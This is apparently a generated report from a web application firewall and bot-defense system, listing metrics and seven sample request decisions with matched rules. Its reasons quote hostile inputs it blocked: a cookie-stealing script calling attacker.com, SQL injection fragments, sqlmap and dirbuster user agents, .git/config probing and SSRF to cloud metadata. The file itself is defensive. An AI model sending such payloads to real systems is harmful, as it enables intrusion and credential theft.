@@ -1,0 +1,120 @@
+{
+  "platform": "Zero-Trust Cloud Edge & Intelligent WAF Bot Defense Mesh",
+  "author": "Kosha Gohil",
+  "generated_at": "2026-10-27T01:07:03.903512+00:00",
+  "metrics": {
+    "total_evaluated": 7,
+    "allowed_count": 1,
+    "challenged_count": 0,
+    "diverted_count": 1,
+    "blocked_count": 5,
+    "threat_ratio_percent": 85.71,
+    "avg_latency_ms": 0.023
+  },
+  "decisions_sample": [
+    {
+      "request_id": "req-default-000",
+      "client_ip": "198.51.100.12",
+      "risk_score": 0,
+      "action": "ALLOW",
+      "matched_rules": [],
+      "reasons": [
+        "Zero threats detected; clean edge request"
+      ],
+      "execution_time_ms": 0.042
+    },
+    {
+      "request_id": "req-default-000",
+      "client_ip": "203.0.113.45",
+      "risk_score": 100,
+      "action": "BLOCK",
+      "matched_rules": [
+        "SQLI_UNION_SELECT",
+        "SQLI_COMMENT"
+      ],
+      "reasons": [
+        "[SQLI] UNION SELECT on QueryString",
+        "[SQLI] -- on QueryString"
+      ],
+      "execution_time_ms": 0.035
+    },
+    {
+      "request_id": "req-default-000",
+      "client_ip": "185.220.101.5",
+      "risk_score": 85,
+      "action": "DIVERT_HONEYPOT",
+      "matched_rules": [
+        "MALICIOUS_BOT_USER_AGENT",
+        "HIGH_RISK_HOSTING_ASN"
+      ],
+      "reasons": [
+        "[BOT] sqlmap on User-Agent",
+        "[ASN_REPUTATION] Bulletproof Hosting ASN: 9009 on ASN"
+      ],
+      "execution_time_ms": 0.018
+    },
+    {
+      "request_id": "req-default-000",
+      "client_ip": "192.0.2.89",
+      "risk_score": 95,
+      "action": "BLOCK",
+      "matched_rules": [
+        "XSS_SCRIPT_TAG",
+        "ANOMALOUS_EMPTY_USER_AGENT"
+      ],
+      "reasons": [
+        "[XSS] <script>fetch('http://attacker.com/steal?cookie=' + document on Body",
+        "[BOT] <empty> on User-Agent"
+      ],
+      "execution_time_ms": 0.024
+    },
+    {
+      "request_id": "req-default-000",
+      "client_ip": "175.45.176.1",
+      "risk_score": 100,
+      "action": "BLOCK",
+      "matched_rules": [
+        "ANOMALOUS_EMPTY_USER_AGENT",
+        "SANCTIONED_GEOLOCATION"
+      ],
+      "reasons": [
+        "[BOT] <empty> on User-Agent",
+        "[GEO_ZERO_TRUST] Sanctioned Origin: KP on CountryCode"
+      ],
+      "execution_time_ms": 0.01
+    },
+    {
+      "request_id": "req-default-000",
+      "client_ip": "198.51.100.99",
+      "risk_score": 100,
+      "action": "BLOCK",
+      "matched_rules": [
+        "SENSITIVE_PROBING",
+        "MALICIOUS_BOT_USER_AGENT",
+        "HONEYPOT_PROBE_ACCESSED"
+      ],
+      "reasons": [
+        "[SENSITIVE] .git/config on URI",
+        "[BOT] dirbuster on User-Agent",
+        "[HONEYPOT] /.git/config on URI"
+      ],
+      "execution_time_ms": 0.014
+    },
+    {
+      "request_id": "req-default-000",
+      "client_ip": "203.0.113.200",
+      "risk_score": 100,
+      "action": "BLOCK",
+      "matched_rules": [
+        "SSRF_CLOUD_METADATA",
+        "ANOMALOUS_EMPTY_USER_AGENT"
+      ],
+      "reasons": [
+        "[SSRF] 169.254.169.254 on URI",
+        "[BOT] <empty> on User-Agent"
+      ],
+      "execution_time_ms": 0.017
+    }
+  ],
+  "sha256_checksum": "e6993b10b0cb7e443b3f6c4ac31cbcbc796cb94ae9609b8d230006a21541f877"
+}
